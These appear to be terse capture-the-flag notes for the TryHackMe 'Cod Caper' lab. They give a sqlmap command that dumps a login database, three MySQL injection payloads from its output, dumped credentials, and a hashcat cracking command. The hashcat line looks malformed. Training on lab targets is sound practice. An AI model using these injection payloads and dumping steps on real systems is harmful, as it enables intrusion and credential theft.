#THM - The Cod Caper

#IP 10.10.8.232

administrator.php > big.txt gobuster



sqlmap -u http://10.10.8.232/administrator.php --data 'username=&password=' -D users -T users --dump
sqlmap resumed the following injection point(s) from stored session:

Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=xMCI' RLIKE (SELECT (CASE WHEN (1655=1655) THEN 0x784d4349 ELSE 0x28 END))-- tLJa&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=xMCI' AND GTID_SUBSET(CONCAT(0x7178716a71,(SELECT (ELT(2397=2397,1))),0x7171706b71),2397)-- wayk&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=xMCI' AND (SELECT 8238 FROM (SELECT(SLEEP(5)))ggKJ)-- FuCJ&password=


Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

hashcat -m 1800 cat /opt/rockyou.txt --force 

love2fish

